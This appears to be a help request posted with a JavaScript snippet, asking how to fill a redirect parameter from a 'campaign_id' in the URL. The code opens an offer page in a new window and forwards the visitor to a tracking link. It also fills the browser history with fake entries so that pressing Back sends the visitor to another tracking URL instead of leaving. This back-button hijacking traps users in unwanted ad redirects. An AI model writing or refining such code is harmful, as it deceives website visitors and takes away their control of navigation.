// Would you be able to suggest a best way to edit this JS, where &redir variable PLACEID  would be dynamically pulled from the url from a campaign_id=12345 url string? //

var offer_url = "https://google.com/click.php?lp=1";
var split_url = "https://google.com/click.php?key=oxv0nt5450qw39c03wro&redir=PLACEID";
function go() {
    window.onbeforeunload = null;
    window.open(offer_url);
    document.location.assign(split_url);
}
var bbURL = "https://google.com/click.php?key=oxv0nt5450qw39c03wro&redir=PLACEID";
!(function () {
    var a;
    try {
        for (a = 0; 3 > a; ++a) {
            history.pushState({}, "", "#");
        }
        onpopstate = function (c) {
            c.state && location.replace(bbURL);
        };
    } catch (b) {}
})();
